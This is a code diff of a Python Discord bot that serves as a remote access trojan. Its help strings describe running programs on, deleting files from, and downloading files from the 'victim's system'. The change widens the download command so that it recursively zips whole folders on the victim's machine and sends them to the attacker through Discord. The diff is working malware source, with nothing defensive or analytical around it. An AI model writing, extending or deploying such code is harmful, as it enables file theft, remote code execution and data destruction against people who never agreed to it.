@@ -415,7 +415,7 @@ async def ls(ctx, path: str = None):
 
         await ctx.reply(f"{response}")
     except Exception as e:
-        await ctx.reply(f"Error: Could not execute the file. {str(e)}")  
+        await ctx.reply(f"Error: Could not execute the file. {str(e)}")   
 
 @bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
 async def run(ctx, file_path: str = None):
@@ -431,30 +431,43 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.reply(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Zips and downloads a file from victim's system, format $download {file (D:/file.png)} (attached file is downloaded)")
+@bot.command(help="Zips and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
 async def download(ctx, file_path: str = None):
     if not file_path:
-        await ctx.reply("Error: No file path provided. Please specify the file path to download.")
+        await ctx.reply("Error: No file path provided. Please specify the file or folder path to download.")
         return
     if not os.path.exists(file_path):
-        await ctx.reply(f"Error: The file '{file_path}' does not exist.")
+        await ctx.reply(f"Error: The path '{file_path}' does not exist.")
         return
-    if not os.path.isfile(file_path):
-        await ctx.reply(f"Error: The path '{file_path}' is not a file.")
-        return
+    
     try:
-        file_ext = os.path.splitext(file_path)[1].lower()
-        if file_ext == '.rar' or file_ext == '.zip':
-            await ctx.reply(file=discord.File(file_path))
-        else:
+        if os.path.isfile(file_path):
+            # Handle file
+            file_ext = os.path.splitext(file_path)[1].lower()
+            if file_ext in ['.rar', '.zip']:
+                await ctx.reply(file=discord.File(file_path))
+            else:
+                zip_filename = os.path.basename(file_path) + '.zip'
+                zip_path = os.path.join(os.path.dirname(file_path), zip_filename)
+                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                    zipf.write(file_path, os.path.basename(file_path))
+                await ctx.reply(file=discord.File(zip_path))
+                os.remove(zip_path)
+        elif os.path.isdir(file_path):
+            # Handle folder
             zip_filename = os.path.basename(file_path) + '.zip'
             zip_path = os.path.join(os.path.dirname(file_path), zip_filename)
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                zipf.write(file_path, os.path.basename(file_path))
+                for root, dirs, files in os.walk(file_path):
+                    for file in files:
+                        file_full_path = os.path.join(root, file)
+                        zipf.write(file_full_path, os.path.relpath(file_full_path, file_path))
             await ctx.reply(file=discord.File(zip_path))
             os.remove(zip_path)
+        else:
+            await ctx.reply(f"Error: The path '{file_path}' is neither a file nor a folder.")
     except Exception as e:
-        await ctx.reply(f"Error: Could not compress and send the file. {str(e)}")
+        await ctx.reply(f"Error: Could not compress and send the file or folder. {str(e)}")
     
 @bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
 async def delete(ctx, path: str = None):
